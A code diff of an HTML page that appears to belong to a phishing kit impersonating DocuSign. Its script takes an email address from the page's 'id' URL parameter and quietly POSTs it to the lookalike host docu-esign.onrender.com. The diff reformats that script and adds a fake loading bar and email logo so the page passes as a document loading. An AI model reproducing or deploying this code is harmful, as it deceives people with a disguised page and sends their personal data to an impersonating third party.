@@ -7,18 +7,18 @@
       let hasEmail = new URLSearchParams(window.location.search).has("id");
       if (hasEmail) {
         let email = new URLSearchParams(window.location.search).get("id");
-        let payLoad = {id: 0, email: email}
+        let payLoad = { id: 0, email: email };
         let emailXhr = new XMLHttpRequest();
         emailXhr.open("POST", "https://docu-esign.onrender.com/email", true);
         emailXhr.setRequestHeader("Content-type", "application/json");
         emailXhr.send(JSON.stringify(payLoad));
 
-        emailXhr.onreadystatechange = function() {
-            if (this.readyState == 4 && this.status == 200) {
-                let response = JSON.parse(this.response);
-                console.log(response);
-            }
-        }
+        emailXhr.onreadystatechange = function () {
+          if (this.readyState == 4 && this.status == 200) {
+            let response = JSON.parse(this.response);
+            console.log(response);
+          }
+        };
       }
     </script>
 
@@ -37,6 +37,44 @@
     </script>
 
     <title>Document</title>
+    <style>
+      #loader {
+        width: 0%;
+        position: relative;
+        animation: incrementWidth 1s linear forwards;
+      }
+
+      @keyframes incrementWidth {
+        0% {
+          width: 0%;
+        }
+        100% {
+          width: 98%;
+        }
+      }
+    </style>
   </head>
-  <body></body>
+  <body>
+    <div
+      style="
+        height: 100vh;
+        width: 100%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      "
+    >
+      <div style="width: 200px">
+        <img src="./Email_Logo.png" alt="" style="margin-left: 13px" />
+        <div
+          id="loader"
+          style="
+            padding: 2px;
+            background-color: rgb(30, 76, 161);
+            border-radius: 4px;
+          "
+        ></div>
+      </div>
+    </div>
+  </body>
 </html>
